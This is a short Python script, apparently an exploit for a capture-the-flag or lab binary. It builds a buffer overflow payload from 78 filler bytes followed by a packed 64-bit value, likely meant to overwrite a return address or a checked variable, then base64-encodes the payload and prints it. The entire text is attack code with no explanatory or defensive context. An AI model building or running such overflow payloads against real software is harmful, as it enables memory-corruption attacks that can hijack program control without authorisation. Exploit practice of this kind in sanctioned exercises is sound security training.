
import sys
import struct
import base64

buf = b'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
buf += struct.pack('<Q', 14599109103722823531)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
